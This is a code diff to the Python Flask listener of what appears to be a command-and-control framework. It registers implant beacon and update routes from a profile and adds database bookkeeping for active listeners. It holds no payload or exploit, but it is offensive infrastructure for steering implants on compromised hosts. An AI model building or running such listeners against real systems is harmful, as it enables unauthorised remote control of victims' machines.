@@ -16,10 +16,10 @@ class WebServer(object):
 
         # parses json profile and gets "beacon_uri" and "update_uri"
         with open(self.profile) as file:
-            j = json.load(file)
+            self.j = json.load(file)
 
-        self.app.add_url_rule(j["implant"]["beacon_uri"], None, self.beacon, methods=["GET", "POST"])
-        self.app.add_url_rule(j["implant"]["update_uri"], None, self.update, methods=["GET", "POST"])
+        self.app.add_url_rule(self.j["implant"]["beacon_uri"], None, self.beacon, methods=["GET", "POST"])
+        self.app.add_url_rule(self.j["implant"]["update_uri"], None, self.update, methods=["GET", "POST"])
 
         # tries to establish a connection to the database
         try:
@@ -31,13 +31,28 @@ class WebServer(object):
             sys.exit()
 
     def start_web_server(self):
+        # inserts an entry into the "listeners" table
+        with self.connection.cursor() as cursor:
+            cursor.execute("INSERT INTO `listeners` (`protocol`, `external_address`, `port`, `profile`, `user_agent`, `sleep`, `beacon_uri`, `update_uri`) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)",
+                (self.protocol, self.external_address, self.port, self.profile, self.j["implant"]["user_agent"], self.j["implant"]["sleep"], self.j["implant"]["beacon_uri"], self.j["implant"]["update_uri"]))
+
         try:
-            print(Style.BRIGHT + Fore.GREEN + "[+] Starting web server." + Style.RESET_ALL)
+            print(Style.BRIGHT + Fore.GREEN + "[+] Starting listener...." + Style.RESET_ALL)
             self.app.run("0.0.0.0", self.port)
 
         # exits the program if an exception is raised
         except:
             print(Style.BRIGHT + Fore.RED + "[!] Error starting web server." + Style.RESET_ALL)
+            sys.exit()
+
+        # web server is killed at this point
+        # we remove the entry from the "listeners" table
+        finally:
+            print(Style.BRIGHT + Fore.GREEN + "[+] Stopping listener...." + Style.RESET_ALL)
+
+            with self.connection.cursor() as cursor:
+                cursor.execute("DELETE FROM `listeners`")
+
             sys.exit()
 
     def beacon(self):
